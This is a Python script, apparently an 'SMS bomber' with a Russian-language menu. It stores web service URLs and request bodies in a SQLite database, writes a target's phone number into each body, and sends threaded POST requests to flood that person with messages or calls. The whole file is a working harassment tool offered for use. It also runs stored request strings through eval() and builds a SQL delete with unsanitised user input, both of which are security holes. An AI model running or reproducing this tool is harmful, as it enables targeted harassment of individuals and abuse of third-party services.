import requests
import threading
import sqlite3
import time
import re
import os
from colorama import init, Fore

def spam(a, b, p):
	for i in re.findall(r'\+?([0-9]{10,11})', b):
		if len(i) == 10 and '+' not in i:
			b = b.replace(i, p[1:])
		elif len(i) == 11 and '+' not in i:
			b = b.replace(i, p)
		elif len(i) == 11 and '+' in i:
			b = b.replace(i, '+'+p[1:])
		elif len(i) == 12 and '+' in i:
			b = b.replace(i, '+'+p)
		elif len(i) == 11 and i[0] == '8':
			b = b.replace(i, '8'+p[1:])
	try:
		requests.post(url = a, data = eval(b), json = eval(b))
		time.sleep(0.01)
		print(re.match('https://(.+?)/', a).group(0))
	except Exception as e:
		print(e)
		time.sleep(0.1)

def start_spam():
	os.system('cls')
	data = sqlite3.connect('bomb.db').cursor().execute('SELECT * FROM site').fetchall()
	if len(data) > 0:
		thread = int(input('\nВведите кол-во потоков: '))
		phone = input('Введите номер телефона (79876543210): ')
		if thread > 0 and len(phone) >= 10:
			print('\n БОМБЕР НАЧАЛ СВОЮ РАБОТУ: \n')
			for i in range(thread):
				for url_site, data_site in data:
					t = threading.Thread(target = spam, args = [url_site, data_site, phone])
					t.start()
					t.join()
		else:
			print('\nНеверно заданы потоки или номер телефона!')
			menu()			
	else:
		print('\nНет сервисов для спама!')
		menu()

def add_base():
	os.system('cls')
	u = input('\nВведите url: ')
	z = input('Введите данные запроса: ')
	conn = sqlite3.connect('bomb.db')
	cursor = conn.cursor()
	cursor.execute('INSERT INTO site VALUES (?,?)', (u,z))
	conn.commit()
	os.system('cls')
	print('\nДанные успешно добавлены!')
	menu()

def clear_base():
	os.system('cls')
	conn = sqlite3.connect('bomb.db')
	cursor = conn.cursor()
	cursor.execute('DELETE FROM site WHERE LENGTH(url)<10 or LENGTH(data)<12 or instr(url, "http") = 0;')
	conn.commit()
	print('\nБаза данных успешно обновлена!')
	menu()

def check_base():
	os.system('cls')
	conn = sqlite3.connect('bomb.db')
	cursor = conn.cursor()
	cursor.execute('SELECT * FROM site')
	data = ['URL: '+i+'\n'+'DATA/JSON: '+j for i,j in cursor.fetchall()]
	if len(data) > 0:
		print('\n'+'\n\n'.join(data))
	else:
		print('\nНет данных!')
	menu()

def del_url_inbase():
	os.system('cls')
	u = input('\nВведите URL, который вы хотите удалить: ')
	conn = sqlite3.connect('bomb.db')
	cursor = conn.cursor()
	cursor.execute(f'DELETE FROM site WHERE url = "{u}";')
	conn.commit()
	os.system('cls')
	print('\nБаза данных успешно обновлена!')
	menu()

def menu():
	print(Fore.RED + '\n--- bomber by shuricius ---')
	to = int(input('1 - Начать спам\n2 - Добавить сайт в базу\n3 - Почистить базу от параши\n4 - Просмотр сайтов в базе\n5 - Удалить конкретный URL\n---------------------------\n'+'Введите пункт меню: '))
	if to == 1:
		start_spam()
	elif to == 2:
		add_base()
	elif to == 3:
		clear_base()
	elif to == 4:
		check_base()
	elif to == 5:
		del_url_inbase()
	else:
		menu()
init()

if 'bomb.db' not in os.listdir():
	conn = sqlite3.connect('bomb.db')
	cursor = conn.cursor()
	cursor.execute('CREATE TABLE site (url text, data text);')
	conn.commit()

menu()

input()